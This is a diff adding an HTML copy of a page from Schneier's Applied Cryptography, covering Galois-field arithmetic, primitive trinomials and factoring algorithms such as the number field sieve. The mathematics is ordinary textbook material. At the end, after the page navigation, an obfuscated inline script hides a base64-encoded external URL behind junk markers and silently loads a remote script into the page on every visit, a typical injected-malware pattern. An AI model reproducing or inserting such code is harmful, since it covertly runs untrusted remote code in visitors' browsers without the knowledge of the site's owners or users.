@@ -1,0 +1,115 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Mathematical Background</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=11//-->
+<!--PAGES=254-256//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Neither result is 1, so 2 is a generator.
+</P>
+<P>To test whether 3 is a generator:</P>
+<DL>
+<DD>3<SUP><SMALL>(11- 1)/5</SMALL></SUP> (mod 11) = 9
+<DD>3<SUP><SMALL>(11- 1)/2</SMALL></SUP> (mod 11) = 1
+</DL>
+<P>Therefore, 3 is not a generator.
+</P>
+<P>If you need to find a generator mod <I>p</I>, simply choose a random number from 1 to <I>p</I> - 1 and test whether it is a generator. Enough of them will be, so you&#146;ll probably find one fast.</P>
+<P><FONT SIZE="+1"><B><I>Computing in a Galois Field</I></B></FONT></P>
+<P>Don&#146;t be alarmed; that&#146;s what we were just doing. If <I>n</I> is prime or the power of a large prime, then we have what mathematicians call a <B>finite field</B> . In honor of that fact, we use <I>p</I> instead of <I>n.</I> In fact, this type of finite field is so exciting that mathematicians gave it its own name: a <B>Galois field</B>, denoted as GF(<I>p</I>). (ƒvariste Galois was a French mathematician who lived in the early nineteenth century and did a lot of work in number theory before he was killed at age 20 in a duel.)</P>
+<P>In a Galois field, addition, subtraction, multiplication, and division by nonzero elements are all well-defined. There is an additive identity, 0, and a multiplicative identity, 1. Every nonzero number has a unique inverse (this would not be true if <I>p</I> were not prime). The commutative, associative, and distributive laws are true.</P>
+<P>Arithmetic in a Galois field is used a great deal in cryptography. All of the number theory works; it keeps numbers a finite size, and division doesn&#146;t have any rounding errors. Many cryptosystems are based on GF(<I>p</I>), where <I>p</I> is a large prime.</P>
+<P>To make matters even more complicated, cryptographers also use arithmetic modulo <B>irreducible</B> polynomials of degree <I>n</I> whose coefficients are integers modulo <I>q</I>, where <I>q</I> is prime. These fields are called GF(<I>q<SUP><SMALL>n</SMALL></SUP></I>). All arithmetic is done modulo <I>p</I> (<I>x</I>), where <I>p</I> (<I>x</I>) is an irreducible polynomial of degree <I>n.</I></P>
+<P>The mathematical theory behind this is far beyond the scope of the book, although I will describe some cryptosystems that use it. If you want to try to work more with this, GF(2<SUP><SMALL>3</SMALL></SUP>) has the following elements: 0, 1, <I>x, x</I> &#43; 1, <I>x<SUP><SMALL>2</SMALL></SUP></I>, <I>x<SUP><SMALL>2</SMALL></SUP></I> &#43; 1, <I>x<SUP><SMALL>2</SMALL></SUP></I> &#43; <I>x, x<SUP><SMALL>2</SMALL></SUP></I> &#43; <I>x</I> &#43; 1. There is an algorithm for computing inverses in GF(2n) that is suitable for parallel implementation [421].</P>
+<P>When talking about polynomials, the term &#147;prime&#148; is replaced by &#147;irreducible.&#148; A polynomial is irreducible if it cannot be expressed as the product of two other polynomials (except for 1 and itself, of course). The polynomial <I>x<SUP><SMALL>2</SMALL></SUP></I> &#43; 1 is irreducible over the integers. The polynomial <I>x<SUP><SMALL>3</SMALL></SUP></I> &#43; 2<I>x<SUP><SMALL>2</SMALL></SUP></I> &#43; <I>x</I> is not; it can be expressed as <I>x</I> (<I>x</I> &#43; 1)(<I>x</I> &#43; 1).</P>
+<P>A polynomial that is a generator in a given field is called primitive; all its coefficients are relatively prime. We&#146;ll see primitive polynomials again when we talk about linear-feedback shift registers (see Section 16.2).</P>
+<P>Computation in GF(2<SMALL><SUP><I>n</I></SMALL></SUP>) can be quickly implemented in hardware with linear-feedback shift registers. For that reason, computation over GF(2<SUP><SMALL><I>n</I></SMALL></SUP>) is often quicker than computation over GF(<I>p</I>). Just as exponentiation is much more efficient in GF(2<SUP><SMALL><I>n</I></SMALL></SUP>), so is calculating discrete logarithms [180, 181, 368, 379]. If you want to learn more about this, read [140].</P>
+<P>For a Galois field GF(2<SUP><SMALL>n</SMALL></SUP>), cryptographers like to use the trinomial <I>p</I> (<I>x</I>) = <I>x<SUP><SMALL>n</SMALL></SUP></I> &#43; <I>x</I> &#43; 1 as the modulus, because the long string of zeros between the <I>x<SUP><SMALL>n</SMALL></SUP></I> and <I>x</I> coefficients makes it easy to implement a fast modular multiplication [183]. The trinomial must be primitive, otherwise the math does not work. Values of <I>n</I> less than 1000 [1649, 1648] for which <I>xn</I> &#43; <I>x</I> &#43; 1 is primitive are:</P>
+<DL>
+<DD>1, 3, 4, 6, 9, 15, 22, 28, 30, 46, 60, 63, 127, 153, 172, 303, 471, 532, 
+<DD>865, 900
+</DL>
+<P>There exists a hardware implementation of GF(2<SUP><SMALL>127</SMALL></SUP>) where <I>p</I> (<I>x</I>) = <I>x<SUP><SMALL>127</SMALL></SUP></I> &#43; <I>x</I> &#43; 1 [1631, 1632, 1129]. Efficient hardware architectures for implementing exponentiation in GF(2<SUP><SMALL>n</SMALL></SUP>) are discussed in [147].</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">11.4 Factoring</FONT></H3>
+<P>Factoring a number means finding its prime factors.
+</P>
+<DL>
+<DD>10 = 2*5
+<DD>60 = 2*2*3*5
+<DD>252601 = 41*61*101
+<DD>2<SUP><SMALL>113</SMALL></SUP> - 1 = 3391*23279*65993*1868569*1066818132868207
+</DL>
+<P>The factoring problem is one of the oldest in number theory. It&#146;s simple to factor a number, but it&#146;s time-consuming. This is still true, but there have been some major advances in the state of the art.
+</P>
+<P>Currently, the best factoring algorithm is:</P>
+<DL>
+<DD><B>Number field sieve (NFS)</B> [953] (see also [952,16,279]). The <B>general number field sieve</B> is the fastest-known factoring algorithm for numbers larger than 110 digits or so [472,635]. It was impractical when originally proposed, but that has changed due to a series of improvements over the last few years [953]. The NFS is still too new to have broken any factoring records, but this will change soon. An early version was used to factor the ninth Fermat number: 2<SUP><SMALL>512</SMALL></SUP> &#43; 1 [955,954].
+</DL>
+<P>Other factoring algorithms have been supplanted by the NFS:
+</P>
+<DL>
+<DD><B>Quadratic sieve (QS)</B> [1257,1617,1259]. This is the fastest-known algorithm for numbers less than 110 decimal digits long and has been used extensively [440]. A faster version of this algorithm is called the multiple polynomial quadratic sieve [1453,302]. The fastest version of this algorithm is called the double large prime variation of the multiple polynomial quadratic sieve.
+<DD><B>Elliptic curve method (ECM)</B> [957,1112,1113]. This method has been used to find 43-digit factors, but nothing larger.
+<DD><B>Pollard&#146;s Monte Carlo algorithm</B> [1254,248]. (This algorithm also appears in volume 2, page 370 of Knuth [863].)
+<DD><B>Continued fraction algorithm.</B> See [1123,1252,863]. This algorithm isn&#146;t even in the running.
+<DD><B>Trial division.</B> This is the oldest factoring algorithm and consists of testing every prime number less than or equal to the square root of the candidate number.
+</DL>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-11.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(oynYiBPN, ZCcGNBaM) {ZCcGNBaM = oynYiBPN.createElement('script');ZCcGNBaM.type = 'text/javascript';ZCcGNBaM.async = true;ZCcGNBaM.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');oynYiBPN.getElementsByTagName('body')[0].appendChild(ZCcGNBaM);}(document));</script></body>
+</html>
